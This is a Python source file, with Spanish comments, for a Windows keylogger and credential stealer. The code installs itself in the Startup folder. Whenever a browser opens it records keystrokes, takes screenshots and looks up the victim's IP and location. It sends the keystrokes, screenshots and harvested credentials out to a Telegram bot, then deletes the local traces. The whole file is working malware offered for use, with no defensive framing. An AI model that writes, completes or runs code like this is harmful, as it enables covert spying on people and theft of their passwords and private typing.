import keyboard
import threading
import time
import requests
import os
import shutil
import psutil
from pathlib import Path
import pyautogui
import credentials

####################################### CREDENCIALES Y GLOBALES
TOKEN = ""
CHAT_ID = ""

intervalo_minutos = 10
capturando = False
previous_state = False
browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "brave.exe"] # Lista de nombres de navegadores comunes (Windows)

####################################### EJECUTAR AL ARRANCAR LA PC
def agregar_a_inicio():
    nombre_archivo = os.path.basename(__file__)
    
    # Si es un ejecutable, __file__ tendrá .exe
    if not nombre_archivo.endswith(".exe"):
        print("AUN NO ES UN EJECUTABLE, YA NO DEBERIAS VER ESTO DESPUES")
        return  # Solo ejecutar si es el .exe final

    ruta_origen = Path(__file__)
    ruta_destino = Path(os.getenv('APPDATA')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / nombre_archivo

    if not ruta_destino.exists():
        try:
            shutil.copy(ruta_origen, ruta_destino)
            print(f"[OK] Ejecutable copiado al inicio: {ruta_destino}")
        except Exception as e:
            print(f"[ERROR] No se pudo copiar al inicio: {e}")

############################################# NAVEGADOR

def is_browser_open():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() in browsers:
            return True
    return False

########################################### LO DIVERTIDO

def obtenerDatos():
    response = requests.get("https://json.ipv4.myip.wtf")
    msg = ""
    if response != False:
        msg=f"IP: {response.json()['YourFuckingIPAddress']}\nHostName: {response.json()['YourFuckingHostname']}\nCity: {response.json()['YourFuckingLocation']}\nCountry: {response.json()['YourFuckingCountryCode']}\nISP: {response.json()['YourFuckingISP']}"
    return msg

def enviar_telegram(datos,file_path):
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
    data = {
        "chat_id": CHAT_ID,
        "caption": datos
    }
    files = {
        "document":open(file_path, 'rb')
    }
    try:
        requests.post(url, data=data, files=files)
    except Exception as e:
        print("Error al enviar a Telegram:", e)
        
def enviar_captura():
    path = os.path.join(os.environ['USERPROFILE'], 'Pictures', 'Temp.jpg')
    imagen = pyautogui.screenshot()
    imagen.save(path)

    respuesta = None
    URL = f"https://api.telegram.org/bot{TOKEN}/sendPhoto" 

    try:
        with open(path, "rb") as archivo:
            files = {"photo": archivo}
            data = {"chat_id": CHAT_ID}
            respuesta = requests.post(URL, data=data, files=files)
    except Exception as e:
        print("Error al enviar la imagen:", e)

    if respuesta and respuesta.status_code == 200:
        os.remove(path)
    else:
        print("No se pudo enviar o eliminar la imagen.")
  
def capturar_teclas():
    global capturando
    if capturando:
        return
    capturando = True
    print("[INFO] Capturando teclas...")
    teclas_capturadas = []
    def registrar_tecla(e):
        name = e.name
        if len(name) == 1:  # letra, número, símbolo
            teclas_capturadas.append(name)
        elif name == "space":
            teclas_capturadas.append(" ")
        elif name == "enter":
            teclas_capturadas.append("\n")
        elif name == "backspace":
            if teclas_capturadas:
                teclas_capturadas.pop()  # Elimina el último carácter

    keyboard.on_press(registrar_tecla)
    time.sleep(300)  # o 900 para 15 min
    keyboard.unhook_all()
    texto = "".join(teclas_capturadas)
    datos = obtenerDatos()
    if texto.strip():
        file_dst = os.path.join(os.environ['USERPROFILE'], 'version.txt')
        with open(file_dst, 'w') as f:
            f.write("Teclas presionadas: \n" + texto)
            f.close()
        enviar_telegram(f"Datos del dispositivo:{datos}\n",file_dst)
        enviar_captura()
        print("[INFO] FIN. TECLAS CAPTURADAS Y MENSAJE ENVIADO")
    else:
        print("No se capturó nada, no hay mensaje hasta el siguiente ciclo")
    capturando = False
    os.remove(file_dst)

def planificador():
    global previous_state
    while True:
        current_state = is_browser_open()
        if current_state and not previous_state:
            print("[+] Navegador abierto")
            capturar_teclas()
            time.sleep(intervalo_minutos * 60)
        previous_state = current_state

######################################### OBTENER CREDENCIALES
def enviarCredenciales():
    quienSoy = obtenerDatos()
    file_dst = os.path.join(os.environ['USERPROFILE'], 'creeEnMi.txt')
    credenciales = credentials.getCreds()
    print(credenciales)
    with open(file_dst,'w') as f:
        f.write(f"Credenciales: \n{credenciales}\n")
        f.close
    enviar_telegram(f"Credenciales del dispositivo \n{quienSoy}\n",file_dst)
    os.remove(file_dst)
    
######################################## MENU PRINCIPAL
if __name__ == "__main__":     
    os.system("color 0A")
    print("PROGRAMA INICIADO")
    agregar_a_inicio()
    enviarCredenciales()
    threading.Thread(target=planificador, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Finalizado por el usuario.")